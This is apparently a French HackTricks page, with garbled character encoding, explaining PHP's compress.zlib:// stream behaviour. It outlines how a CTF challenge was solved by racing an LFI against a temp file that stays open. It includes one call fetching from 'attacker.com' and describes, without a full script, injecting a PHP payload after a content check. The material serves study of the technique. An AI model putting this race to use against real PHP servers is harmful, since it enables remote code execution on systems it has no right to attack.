## `compress.zlib://` et `PHP_STREAM_PREFER_STDIO`

Un fichier ouvert en utilisant le protocole `compress.zlib://` avec le drapeau `PHP_STREAM_PREFER_STDIO` peut continuer Ã  Ã©crire des donnÃ©es qui arrivent Ã  la connexion plus tard dans le mÃªme fichier.

Cela signifie qu'un appel tel que:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Vous enverrez une requÃªte demandant http://attacker.com/file, puis le serveur pourrait rÃ©pondre Ã  la requÃªte avec une rÃ©ponse HTTP valide, maintenir la connexion ouverte et envoyer des donnÃ©es supplÃ©mentaires ultÃ©rieurement qui seront Ã©galement Ã©crites dans le fichier.

Vous pouvez voir cette information dans cette partie du code php-src dans main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

    if (flags & PHP_STREAM_PREFER_STDIO) {
        *newstream = php_stream_fopen_tmpfile();
    } else {
        *newstream = php_stream_temp_new();
    }
```
## Course Ã  la condition de RCE

Ce CTF a Ã©tÃ© rÃ©solu en utilisant la technique prÃ©cÃ©dente.

L'attaquant va faire en sorte que le serveur victime ouvre une connexion pour lire un fichier depuis le serveur de l'attaquant en utilisant le protocole `compress.zlib`.

Tant que cette connexion existe, l'attaquant va exfiltrer le chemin d'accÃ¨s au fichier temporaire crÃ©Ã© (celui-ci est divulguÃ© par le serveur).

Tant que la connexion est toujours ouverte, l'attaquant va exploiter une LFI en chargeant le fichier temporaire qu'il contrÃ´le.

Cependant, il y a une vÃ©rification dans le serveur web qui empÃªche le chargement de fichiers contenant `<?`. Par consÃ©quent, l'attaquant va exploiter une course conditionnelle. Dans la connexion qui est toujours ouverte, l'attaquant va envoyer la charge utile PHP APRÃˆS que le serveur web ait vÃ©rifiÃ© si le fichier contient les caractÃ¨res interdits mais AVANT de charger son contenu.

Pour plus d'informations, consultez la description de la course conditionnelle et du CTF sur [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersÃ©curitÃ© ? Voulez-vous voir votre entreprise annoncÃ©e dans HackTricks ? ou voulez-vous avoir accÃ¨s Ã  la derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
